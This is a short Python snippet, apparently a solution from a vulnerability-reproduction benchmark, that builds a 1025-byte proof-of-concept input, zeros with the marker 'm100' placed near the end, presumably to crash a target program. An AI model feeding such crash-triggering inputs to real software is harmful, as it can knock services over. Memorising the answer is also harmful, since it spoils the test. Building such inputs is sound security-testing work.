class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = bytearray(1025)
        poc[1020:1024] = b'm100'
        return bytes(poc)